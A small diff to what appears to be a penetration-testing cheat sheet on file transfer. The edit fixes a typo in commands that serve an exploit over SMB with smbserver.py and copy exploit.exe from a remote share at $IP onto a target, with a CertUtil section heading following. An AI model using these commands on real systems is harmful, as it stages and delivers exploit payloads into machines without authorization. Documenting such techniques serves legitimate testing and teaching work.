@@ -67,7 +67,7 @@ New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
 
 ```bash
 python3 smbserver.py ROPNOP /path/to/exploit
-copy \$IP\ROPNOP\exploit.exe`
+copy \$IP\ROPNOP\exploit.exe
 ```
 
 ## CertUtil
